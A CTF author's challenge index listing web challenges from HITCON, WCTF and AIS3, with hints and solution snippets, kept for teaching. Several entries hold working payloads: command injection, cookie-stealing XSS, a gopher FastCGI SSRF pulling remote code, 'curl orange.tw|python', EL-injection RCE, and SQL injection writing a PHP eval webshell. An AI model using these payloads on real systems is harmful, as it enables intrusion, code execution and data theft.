My CTF Web Challenges
This is the repository of all CTF challenges I made, including the source code, write-up and idea explanation!
Hope you like it :)  
P.s. BTW, the Babyfirst series and One Line PHP Challenge are my favorite challenges. If you haven't enough time, please look them at least!

Babyfirst 
Babyfirst Revenge 
Babyfirst Revenge v2 
One Line PHP Challenge 


And you can find me via:
 Email: orange@chroot.org 
 Blog: http://blog.orange.tw 
* Twitter: @orange_8361 

Table of Content


HITCON 2020

oShell
oStyle
Return of Use-After-Flee



HITCON 2019 Quals

Virtual Public Network
Bounty Pl33z
GoGo PowerSQL
Luatic
Buggy .Net 



HITCON 2018

One Line PHP Challenge
Baby Cake
Oh My Raddit
Oh My Raddit v2
Why so Serials? 



HITCON 2017 Quals

BabyFirst Revenge
BabyFirst Revenge v2
SSRFme?
SQL so Hard
Baby^H Master PHP 2017 



HITCON 2016 Quals

%%%
Leaking
BabyTrick
Angry Boy
Angry Seam 



HITCON 2015 Quals 

Babyfirst
nanana
Giraffe's Coffee
lalala
Use-After-FLEE



HITCON 2014 Quals

PUSHIN CAT
PY4H4SHER
LEENODE



WCTF 2016 

BlackBox



AIS3 Final 2015 Final

SQLPWN




oShell
Difficulty: ★★
Solved: 21 / 1281
Tag:   BlackBox, Shell ,Command Injection 
Source Code

Source 

Solution

Leveraging strace in htop to read enable secret.
Writing /home/oShell/.toprc with tcpdump -w
Abusing top inspect feature to run arbitrary commands

Write Ups

Writeup from team FrenchRoomba 

oStyle
Difficulty: ★★☆
Solved: 10 / 1281
Tag:   XSS
Source Code

Source 

Solution

The default Apache installation enabled mod_negotiation, which allows .var mapping and you can specify arbitrary content-type there.

test.var

Write Ups

TBD

Return of Use-After-Flee
Difficulty: ★★★★★
Solved: 0 / 1281
Tag: WhiteBox, PHP, UAF, PWN 
Source Code

Source 

Solution

Exploiting CVE-2015-0273 to pop the shell without known binaries. More detail will be published in my blog soon.

Write Ups

TBD

Virtual Public Network
Difficulty: ★☆
Solved: 81 / 1147
Tag:   WhiteBox, Perl, Command Injection 
Source Code

Source 

Solution

Refer my blog and Black Hat 2019 USA slides for details 
Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!
Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs 



http://13.231.137.9/cgi-bin/diag.cgi
?options=-r@a="ls -alh /",system@a%23 2>tmp/orange.thtml <
&tpl=orange
Write Ups

TBD

Bounty Pl33z
Difficulty: ★★★☆
Solved: 30 / 1147
Tag:   XSS
Source Code

Website 
XSS bot 

Solution

Idea from @FD - A little known JavaScript comment style SingleLineHTMLOpenComment and HTMLCloseComment in EMCA specification. 

Here we use unicode U+2028 and U+3002 to bypass \n and . filters.
http://3.114.5.202/fd.php
?q=ssl。orange。tw?xx"%2bdocument[`cookie`]%E2%80%A8-->
Unintended Solution

Nesting template expression

http://3.114.5.202/fd.php
?q=ssl。orange。tw?`%2b"%2bdocument[`cookie`];(`${`
Write Ups

TBD

GoGo PowerSQL
Difficulty: ★★★☆
Solved: 16 / 1147
Tag:   Environment Injection, MySQL Client Attack
Source Code

Docker 

Solution

Buffer Overflow the DB_HOST in BSS
Due to the patch, we can pollute environment variable which are not in the Blacklist.
Hijack MySQL connection by ENV such as LOCALDOMAIN or HOSTALIAES
Read /FLAG by LOAD DATA LOCAL INFILE.


shell
$ git clone https://github.com/lcark/MysqlClientAttack.git
$ cd MysqlClientAttack
$ python main.py -F /FLAG
Write Ups

TBD

Luatic
Difficulty: ★★☆
Solved: 42 / 1147
Tag:   WhiteBox, Redis, Lua
Source Code

Docker 

Solution

Override PHP global variables.
Redis implements eval command by string concatenations so that we can escape the original Lua function to override global objects.

http://54.250.242.183/luatic.php
?_POST[TEST_KEY]=return 1 end function math:random() return 2
&_POST[TEST_VALUE]=0
&_POST[MY_SET_COMMAND]=eval
&_POST[token]=<token>
&_POST[guess]=2
http://54.250.242.183/luatic.php
?_POST[token]=<token>
&_POST[guess]=2
Unintended Solution

Lua is so magic that there are several unintended solutions. Sorry for the imperfect challenge :(

Write Ups

TBD

Buggy .Net
Difficulty: ★☆
Solved: 13 / 1147
Tag:   ASP.NET, WhiteBox
Source Code

Default.aspx 

Solution

Using .NET request validation to trigger the exception and bypass the filter
Idea from Soroush Dalili's  WAF Bypass Techniques - Using HTTP Standard and Web Servers' Behaviour in AppSec Europe 2018(p30~p34)  



Write Ups

TBD

One Line PHP Challenge
Difficulty: ★★★★
Solved: 3 / 1816
Tag:   PHP
Source Code

index.php 

Solution
P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04

Control partial session file content by PHP_SESSION_UPLOAD_PROGRESS
Bypass session.upload_progress.cleanup = On by race condition or slow query

Control the prefix to @<?php by chaining PHP wrappers


exp_for_php.py

Offical writeup for One Line PHP Challenge 

Write Ups

(English)One Line PHP Challenge 
(中文)One Line PHP Challenge 
hitcon2018 One Line PHP Challenge 
hitcon 2018受虐笔记一:one-line-php-challenge 学习 

Baby Cake
Difficulty: ★★★
Solved: 4 / 1816
Tag:   Code Review, PHP, De-serialization
Source Code

index.php 

Solution
Due to the implement of CURLOPT_SAFE_UPLOAD in CakePHP FormData.php. We can read arbitrary files!


exploit.phar

Write Ups

Baby Cake 
Hitcon 2018 Web - Oh My Raddit / Baby Cake 题解 
HITCON CTF 2018 Web WP 之 Baby Cake 

Oh My Raddit
Difficulty: ★★☆
Solved: 27 / 1816
Tag:   Observation, DES checksum, Crypto, Web
Source Code

app 

Solution

Know ECB mode from block frequency analysis
Know block size = 8 from cipher length
From the information above, it's reasonable to use DES in real world
The most common block is 3ca92540eb2d0a42(always in the cipher end). We can guess it's the padding \x08\x08\x08\x08\x08\x08\x08\x08
Due to the checking parity in DES, we can reduce the keyspace from 26(abcdefghijklmnopqrstuvwxyz) to 13(acegikmoqsuwy)
Break in 1 second with HashCat
Break in 10 minutes with single thread Python



Write Ups

Oh My Raddit 
Oh my raddit
2018HITCON-Oh My Raddit&v2题解 

Oh My Raddit v2
Difficulty: ★★
Solved: 10 / 1816
Tag:   Web.py,  SQL Injection to RCE
Source Code

app 

Solution

Read the package version from requirements.txt

Remote Code Execution in Web.py framework


exp.py


Write Ups

Oh My Raddit V2
Oh My Raddit v2 
2018HITCON-Oh My Raddit&v2题解 

Why so Serials?
Difficulty: ★★★★
Solved: 1 / 1816
Tag:   De-serialization, RCE, ASP.NET, View State
Source Code

Default.aspx 

Solution

Get the machineKey in web.config by Server-Side-Includes(.shtml or .stm)
Exploit ASP.NET ___VIEWSTATE by ysoserial.net

Write Ups

HITCON 2018: Why so Serials? Write-up 
HITCON CTF 2018 - Why so Serials? Writeup 

BabyFirst Revenge
Difficulty: ★☆
Solved: 95 / 1541
Tag:  WhiteBox, PHP, Command Injection 
Idea

Command Injection, but only in 5 bytes  

Source Code

index.php 

Solution

You can check the exploit.py for the detail! And there are also lots of creative solutions, you can check the write ups below.
Write Ups

HITCON CTF 2017-BabyFirst Revenge-writeup 
HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl) 
HITCON 2017 CTF BabyFirst Revenge 
HITCON CTF 2017 - BabyFirst Revenge (172 pts.) 
Hitcon CTF 2017 - Baby Revenge 
Hitcon CTF 2017 Quals: Baby First Revenge (web 172) (Via xxd) 
HITCON CTF 2017 BabyFirst Revenge & v2 writeup 
BabyFirst-Revenge-HITCOIN-2017-QUALS by @n4p5ter 

BabyFirst Revenge v2
Difficulty: ★★★★
Solved: 8 / 1541
Tag:  WhiteBox, PHP, Command Injection 
Idea

Command Injection, but only in 4 bytes  

Source Code

index.php 

Solution

generate g> ht- sl to file v
reverse file v to file x
generate curl orange.tw|python;
execute x, ls -th >g
execute g

You can check exploit.py for the detail!
Write Ups

Baby First Revenge v2 (Via vim) by @bennofs 
[python] baby-exp.py 
How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2 
HITCON CTF 2017 BabyFirst Revenge & v2 writeup 

SSRFme?
Difficulty: ★★☆
Solved: 20 / 1541
Tag:  WhiteBox, Perl, PATH Pollution 
Idea

CVE-2016-1238 (But the latest version of Ubuntu 17.04 in AWS is still vulnerable)  
Perl lookup current directory in module importing  
Perl module URI/lib/URI.pm#L136 will eval if there is a  unknown scheme

Source Code

index.php 

bash
$ sudo apt install libwww-perl
Solution

Write Ups

Another Solution by @Paul_Axe 
HITCON 2017 SSRFme 
SSRFme by @sorgloomer 

SQL so Hard
Difficulty: ★★★
Solved: 10 / 1541
Tag:  WhiteBox, MySQL, PostgreSQL, SQL Injection, Code Injection 
Idea

MySQL max_allowed_packet dropped large size SQL sentence  
Node-Postgres - code execution vulnerability 
Exploit the RCE in SQL UPDATE syntax

Source Code

app.js 

Solution

exploit.py 

Write Ups

SQL so Hard by @sorgloomer 

Baby^H Master PHP 2017
Difficulty: ★★★★☆
Solved: 0 / 1541
Tag:  WhiteBox, PHP, Serialization, Apache Prefock 
Idea

PHP do the de-serialization on PHAR parsing
PHP assigned a predictable function name \x00lambda_%d to an anonymous function  
Break shared VARIABLE state in Apache Pre-fork mode

Source Code

index.php 

Solution


avatar.gif 
fork.py

Write Ups

По умолчанию Чтение файлов => unserialize ! 

papapa
Difficulty: ★
Solved: 71 / 1024
Tag:  BlackBox, SSL, Pentesting 
Idea

Leak the internal hostname from SSL certificate  

Source Code

here 

Solution

Write Ups

HITCON 2016 
HITCON CTF 2016: %%% (Web) Write-up 
[HITCON 2016] [WEB 100 - %%%] WRITE UP 
hitcon2016 web writeup 

Leaking
Difficulty: ★★
Solved: 43 / 1024
Tag: WhiteBox, JavaScript, NodeJS 
Idea

Break JavaScript Sandbox
Use NodeJS Buffer(int) to steal uninitialized memory  
Node.js Buffer knows everything

Source Code

here

Solution

Write Ups

Hello HitCon 2016 CTF 
HITCON 2016 web 总结 
hitcon2016 web writeup

BabyTrick
Difficulty: ★★★
Solved: 24 / 1024
Tag: WhiteBox, PHP, MySQL, SQL Injection, Unserialize
Idea

Create an Unexpected Object and Don't Invoke __wakeup() in Deserialization
SugarCRM v6.5.23 PHP反序列化對象注入漏洞
MySQL UTF-8 collation - SELECT 'Ä'='a' is True

Source Code

here

Solution

Write Ups

Hitcon 2016 – Baby Trick
Hello HitCon 2016 CTF 
hitcon2016 web writeup

Angry Boy
Difficulty: ★★☆
Solved: 43 / 1024
Tag: GrayBox, Java
Idea

new String(new byte[] {1, -1, 1, -1}) will output 01EFBFBD01EFBFBD, not 01FF01FF
When ‘EFBFBD’ And Friends Come Knocking: Observations Of Byte Array To String Conversions

Source Code

here

Solution

exploit.py
decrpt.py

Write Ups

Angry Boy - Web 300 Problem

Angry Seam
Difficulty: ★★★★
Solved: 4 / 1024
Tag: GrayBox, Java, Seam Framework, CSS RPO, EL Injection, Java Deserialization 
Idea

CSS Relative Path Overwrite  
Built-in redirection parameter actionOutcome 
RPO Gadgets 
CVE-2010-1871: JBoss Seam Framework remote code execution 

Source Code

here

Solution

P.s. I made this challenge because once when I try to review the code of Seam Framework, I found some 0-days and I think it must have more. So I throw out the brick to attract a jade. And the result is more than I expected :P  

Intended solution 


Register an account
username: `AAAAAA`    
   password: `AAAAAA`  
   realname: `{/*';*/}%0a@import'http://orange.tw/?`


Report URL
http://1.2.3.4:8080/angryseam/profile.seam?actionOutcom>e=/profile.seam?username%3dAAAAAA



Unintended solution 

Register an account  
Update description to  
Login and access   

/?x=#{expressions.instance().createValueExpression(request.getHeader('cmd')).getValue()}
GET /angryseam/template.seam?actionMethod=template.xhtml:util.escape(sessionScope['user'].getDescription()) HTTP/1.1
host: 1.2.3.4
cmd: #{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),request.getHeader('ccc'))}
ccc: ls -alh
...
Unintended solution 

CVE-2013-2165 Java deserialization vulnerability


Unintended solution 

SESSION manipulation... seam SUCKS  

Write Ups

Web500 Hitconctf 2016 and exploit CVE-2013-2165
Angry Seam (500 pts)

Babyfirst
Solved: 33 / 969
Difficulty: ★★
Tag: WhiteBox, PHP, Command Injection 
Idea

Use NewLine to bypass regular expression check  
Command injection only with alphanumeric characters  

Source Code

here 


Solution

And there are also lots of creative solutions, you can check the write ups below.  
Write Ups

babyfirst (web 100) 
HITCON CTF 2015 Web 100 Web 300 Writeup 
HITCON 2015 Quals: Babyexploit 
Babyfirst (web, 100p, ?? solves) 

nanana
Difficulty: ★★★
Solved: 18 / 969
Tag: GrayBox, C, PWN 
Idea

Pwn without library  
Format String without output  
Bypass Stack Guard by using overflow ARGV[1] 

Source Code

here 

Solution

exploit.py 

Write Ups

nanana (pwn, web 200) 
HITCON 2015 Quals: Nanana 
Pwning (sometimes) with style - Dragons’ notes on CTFs 

Giraffe's Coffee
Difficulty: ★★★☆
Solved: 16 / 969
Tag:  WhiteBox, PHP 
Idea

Break PHP PRNG  
Break shared PRNG STATE in Apache Prefork mode  

Source Code

here 

Solution
TBD

Write Ups

HITCON CTF 2015 Web 100 Web 300 Writeup
Giraffe's Coffee - Web 300 Problem - Writeup by Robert Xiao (@nneonneo)
HITCON 2015 WEB 300

lalala
Difficulty: ★★★☆
Solved: 2 / 969
Tag: BlackBox, PHP, SSRF 
Idea

Bypass SSRF restrictiton with 302 redirect  
Exploit FASTCGI protocol by using GOPHER  

Source Code

here 

Solution
php
<?php
header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%86%00%00%0E%03REQUEST_METHODGET%0F%0ASCRIPT_FILENAME/www/a.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );
Write Ups

HITCON CTF 2015 Web 100 Web 300 Writeup 
Hitcon 2015 lalala web400 task 

Use-After-FLEE
Solved: 1 / 969
Difficulty: ★★★★☆
Tag: WhiteBox, PHP, UAF, PWN 
Idea

Bypass open_basedir  
Bypass disable_functions  
PHP use-after-free exploit writing  
Bypass full protection (DEP / ASLR / PIE / FULL RELRO)  
Yet Another Use After Free Vulnerability in unserialize() with SplDoublyLinkedList 

Source Code

here 

Solution
TBD

Write Ups

Use-After-FLEE (pwn, web 500)

PUSHIN CAT
Solved: 8 / 1020
Difficulty: ★★
Platform:  BlackBox, PHP, H2, SQL Injection 
Idea

SQL Injection on H2 Database  
Execute Code by using H2 SQL Injection  

Source Code

here 

Solution
TBD

Write Ups

HITCON CTF 2014: PUSHIN CAT
HITCON CTF 2014 - PUSHIN CAT (H2 DB Insert SQL Injection)
HITCON CTF 2014

PY4H4SHER
Solved: 30 / 1020
Difficulty: ★★☆
Tag: WhiteBox, Python, Collision, HPP 
Idea

Python CGI HTTP Pollution  
MySQL old_password hash collisions  
PBKDF2+HMAC hash collisions explained 

Source Code

here 

Solution
TBD

Write Ups

HITCON CTF 2014: PY4H4SHER 
HITCON CTF 2014: PY4H4SHER WRITEUP 
py4h4sher_solution.py 
HITCON CTF 2014 

LEENODE
Solved: 2 / 1020
Difficulty: ★★★
Tag: BlackBox, ColdFusion, Apache 
Idea

Multilayered architecture vulnerability  
Double Encoding  

Source Code

here 

Solution

Write Ups

HITCON CTF 2014: LEENODE 
(web) LEENODE [250] 
CTF/Writeup/HITCON2014/LEENODE 

BlackBox
Solved: 0 / 12
Difficulty: ★★★★
Tag: GrayBox, PHP, JAVA, mod_jk, H2, SQL Injection, WAF 
Idea

Multilayered architecture vulnerability  
Default and up to date mod_jk leads to directory travesal  
Bypass WAF by incorrect usage of BASE64 and URLENCODE  
SQL Injection on H2 Database  
Execute Code by using H2 SQL Injection  

Source Code

here 

Solution


Get source code
text
   http://1.2.3.4/login/..;/


Review code and find a way to bypass WAF
bash
   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,version(),null--"
   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_read('/etc/apache2/sites-enabled/000-default.conf'),null--" 


Write shell
bash
    $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_write('3c3f706870206576616c28245f504f53545b6363635d293b3f3e', '/www/write_shell_here_=P/.a.php'),null--"
    $ curl "http://1.2.3.4/write_shell_here_=P/.a.php" -d 'phpinfo();'


Write Ups
TBD

SQLPWN
Solved: 0 / ??
Difficulty: ★★★
Tag: WhiteBox, PHP, SQL Injection, LFI, Race Condition 
Idea

One-byte off SQL Injection  
Race Condition  
Local file inclusion with PHP session  

Source Code

here 

Solution


Run exploit.py to win race condition


Login and SQL Injection


bash
   $ curl http://1.2.3.4/sqlpwn.php -d 'title=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\&note=, concat(0x3a3a3a3a3a3a,(select pass from users where name=0x6f72616e6765)))#'

Local file inclusion with session
   bash
   $ curl http://1.2.3.4/sqlpwn.php?mode=admin&boom=../../../../../../var/lib/php5/sess_243220 

Write Ups

AIS3 Final CTF Web Writeup (Race Condition & one-byte off SQL Injection) 
AIS3 CTF Final Web1 & Web2 
